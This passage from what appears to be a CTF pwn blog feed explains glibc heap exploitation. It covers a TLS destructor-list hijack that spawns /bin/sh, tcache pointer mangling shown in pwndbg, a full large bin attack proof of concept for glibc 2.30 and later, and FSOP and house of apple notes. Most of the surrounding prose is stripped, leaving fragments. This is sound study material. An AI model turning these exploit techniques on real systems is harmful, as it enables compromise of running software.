class="type">long</span> <span class="type">long</span> random_number;</span><br><span class="line">  <span class="type">void</span> *system_ptr = (<span class="type">void</span> *)&amp;system;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;system:%p\n&quot;</span>, system_ptr);</span><br><span class="line">  <span class="built_in">asm</span>(<span class="string">&quot;mov %%fs:0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(fs_base));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value in FS register: 0x%llx\n&quot;</span>, fs_base);</span><br><span class="line">  tls_dtor_list_addr = fs_base - <span class="number">80</span>;</span><br><span class="line">  random_number = *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(fs_base + <span class="number">0x30</span>);</span><br><span class="line">  <span class="type">char</span> *str_bin_sh = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(str_bin_sh, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)ptr =</span><br><span class="line">      <span class="built_in">rotate_left</span>((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)system_ptr ^ random_number, <span class="number">0x11</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(ptr + <span class="number">8</span>) = str_bin_sh;</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)tls_dtor_list_addr = ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  tcache bin attack </p><ul><li>tcache fd </li></ul><p> chunk  tcache bin </p><ul><li> header  chunk  tcache_entry</li><li>key </li><li>nextnext12 <code>prev tcache bin</code>  <code>xor</code> </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk2mem(p) ((void*)((char*)(p) + CHUNK_HDR_SZ))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;                <span class="comment">//  fd  </span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span> </span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)<span class="built_in">chunk2mem</span>(chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;      <span class="comment">// tcache_key_initialize (void) </span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = <span class="built_in">PROTECT_PTR</span>(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache next</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592a0: 0x0000000555555559      0xa8d3bb0dc1ab0725</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000051</span><br><span class="line">0x5555555592f0: 0x000055500000c7f9      0xa8d3bb0dc1ab0725</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p/x (0x5555555592f0 &gt;&gt; 12) ^ 0x5555555592a0</span><br><span class="line"><span class="variable">$1</span> = 0x55500000c7f9</span><br></pre></td></tr></table></figure><p>fd</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(addr &gt;&gt; <span class="number">12</span>) ^ pos</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://kagehutatsu.com/?p=951">2023  Pwn Writeup</a></li><li><a href="https://blog.xmcve.com/2023/11/05/%E9%B9%8F%E5%9F%8E%E6%9D%AF2023-Writeup/#title-7">2023 Writeup</a></li><li><a href="https://unauth401.tech/pcb2023/#baby-heap"> 2023  Pwn WriteUp</a></li><li><a href="https://mp.weixin.qq.com/s/tjz3urSdsQac30JiqVN62Q">2023WriteUp</a></li><li><a href="https://www.cnblogs.com/ZIKH26/articles/16066329.html">DASCTF2022_checkin - ZikH26</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&amp;&amp;</title>
      <link href="/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/"/>
      <url>/2023/11/02/%E7%8C%AB%E7%8C%AB%20&amp;&amp;%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><code>glibc</code><code>__malloc_hook/__free_hook/__realloc_hook</code><code>hook</code></p><p> IO_FILE IO_FILE </p><h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>bin <a href="https://xz.aliyun.com/t/5177">largebin attack</a><br>binfree</p><ul><li>fd, bk: </li><li>fd_nextsize, bk_nextsize: </li><li>fd, bk main_arena fd_nextsize  bk_nextsize </li></ul><p> how2heap 2.36  large bin attack (Glibc &gt;&#x3D; 2.30 )</p><ul><li>victim(largebin)sizebin</li><li>mallocchunk p1,p2 0x18  <strong>unsorted bin </strong>  <strong>top_chunk</strong></li><li>p1  size  p2largebin </li><li>free p1 p1 large bin </li><li>free p2 p1  bk_nextsize  &amp;target-0x20</li><li> p2 largebin</li><li>target  p2 </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">// bin</span></span><br><span class="line"><span class="comment">// bck  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">// av  arenabckarena</span></span><br><span class="line"><span class="comment">// fwd = bck-&gt;fd;   large bin  p1</span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim large bin  p2 </span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">// victim.bk_nextsize = &amp;target-0x20 fd_nextsize = victim  target  victim</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br>Glibc 2.29 unsortedbin attack  largebin attack  bk </p><p>fd,bk,fd_nextsize mallocfdfd size  victim</p><h3 id="IO-"><a href="#IO-" class="headerlink" title="IO "></a>IO </h3><p>   vtable </p><p>exit</p><ul><li>mainglibcexit</li><li> exit </li></ul><p>malloc_assert: house of kiwi </p><ul><li>topchunkMINSIZE(0X20)  </li><li>prev inuse0  </li><li>old_top</li><li>libc 2.36 IOlibc 2.36</li><li>libc 2.37 </li></ul><p>libc 2.35</p><ul><li>(fflsh, fxpeintf)IO</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP_IO_list_alllarge bin attack_IO_flush_all_lockp_IO_list_all.</p><p> main  exit  fcloseall </p><ul><li><code>_IO_list_all</code><code>IO_FILE</code></li><li><code>vtable-&gt;_overflow</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">fcloseall</span><br><span class="line">_IO_cleanup</span><br><span class="line">_IO_flush_all_lockp</span><br><span class="line">_IO_OVERFLOW</span><br></pre></td></tr></table></figure><p>vtable  <code>__overflow</code> </p><ul><li><code>IO_validate_vtable</code><code>vtable</code><code>vtable</code><code>vtable</code></li><li> vtable </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure><p></p><ul><li> vtable  <code>__io_vtables</code> </li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vtable</p><p> <code>_wide_data</code> vtable</p><ul><li>3  <code>_IO_wfile_jumps</code> </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote><p> version 2.0</p></blockquote><ol><li>IO exit  malloc_assert</li><li><code>heap</code><code>libc</code> </li><li><code>largebin attack</code></li></ol><p>wide_data </p><ul><li> vtable</li><li>FSOP<code>_wide_vtable</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>vtable  <code>IO_wdata_jumps</code> overflow</p><ul><li> <code>_IO_wfile_jumps</code>  overflow </li><li></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 